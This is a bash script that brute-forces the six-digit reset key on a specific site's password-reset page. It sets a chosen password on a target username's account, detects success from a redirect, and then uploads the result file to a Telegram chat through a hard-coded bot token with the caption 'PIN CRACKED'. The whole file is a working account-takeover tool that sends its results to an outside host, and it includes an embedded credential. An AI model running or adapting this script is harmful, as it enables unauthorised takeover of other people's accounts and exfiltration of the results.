#!/bin/bash
username=$1
TELEGRAM_BOT_TOKEN="8001910878:AAHV7sLYtsKhMRTcxaTtN1OABhwPeuofmgI"
TELEGRAM_CHAT_ID="6729179510"

url="https://sohei.io/reset"
output_file="found_key.txt"
wordlist_path="/home/usr/6digitPIN.txt"

# Headers from working cURL command
headers=(
    "User-Agent: Mozilla/5.0 (Linux; Android 15; 24129RT7CC Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.38 Mobile Safari/537.36"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    "Content-Type: application/x-www-form-urlencoded"
    "cache-control: max-age=0"
    "sec-ch-ua: \"Android WebView\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\""
    "sec-ch-ua-mobile: ?1"
    "sec-ch-ua-platform: \"Android\""
    "origin: https://sohei.io"
    "upgrade-insecure-requests: 1"
    "sec-fetch-site: same-origin"
    "sec-fetch-mode: navigate"
    "sec-fetch-user: ?1"
    "sec-fetch-dest: document"
    "referer: https://sohei.io/reset"
    "accept-language: en-US,en;q=0.9"
    "priority: u=0, i"
)

[ ! -f "$wordlist_path" ] && echo "Error: Wordlist not found" && exit 1
total_lines=$(wc -l < "$wordlist_path")
[ "$total_lines" -eq 0 ] && echo "Error: Wordlist is empty" && exit 1

counter=0
success=false
> "$output_file"

echo "Starting brute-force attack (${total_lines} combinations)..."
echo "------------------------------------------------------------"

while IFS= read -r code; do
    ((counter++))

    # Clean input and skip empty
    code=$(echo "$code" | tr -cd '[:digit:]')
    [ -z "$code" ] && continue

    # Build POST data with proper encoding
    post_data=$(
        printf "username=%s&newpass=%s&confirmpass=%s&secure_key=%s&submit=" \
        "$(printf "%s" "$username" | jq -sRr @uri)" \
        "$(printf "%s" "@GonnaCry1337" | jq -sRr @uri)" \
        "$(printf "%s" "@GonnaCry1337" | jq -sRr @uri)" \
        "$(printf "%s" "$code" | jq -sRr @uri)"
    )

    # Send request with headers
    response=$(curl -s -i -X POST "$url" \
        "${headers[@]/#/-H}" \
        --data-raw "$post_data" \
        --http2 \
        --connect-timeout 15 \
        --max-time 20 \
        2>&1)

    # Check for success conditions
    http_status=$(echo "$response" | grep -E '^HTTP/' | tail -1 | awk '{print $2}')
    location_header=$(echo "$response" | grep -i '^Location:' | awk '{print $2}' | tr -d '\r')

    if [[ "$http_status" == "302" ]] && [[ "$location_header" == */home* ]]; then
        timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        echo -e "\n\n[SUCCESS] Valid key: $code"
        echo "Timestamp: $timestamp" | tee -a "$output_file"
        echo "HTTP Status: 302" | tee -a "$output_file"
        echo "Location Header: $location_header" | tee -a "$output_file"
        success=true
        break
    fi

    printf "Testing: %-12s | Status: %3s | Progress: %d/%d (%.2f%%) \r" \
           "$code" "$http_status" "$counter" "$total_lines" \
           $(echo "scale=2; $counter/$total_lines*100" | bc)


done < <(grep -v '^$' "$wordlist_path" | tr -d '\r')

[ "$success" = false ] && echo -e "\n[WARNING] No valid key found" | tee -a "$output_file"

 curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument" \
            -F chat_id="$TELEGRAM_CHAT_ID" \
            -F document=@"$output_file" \
            -F caption="PIN CRACKED" > /dev/null
echo -e "\nProcess completed. Results saved to $output_file"

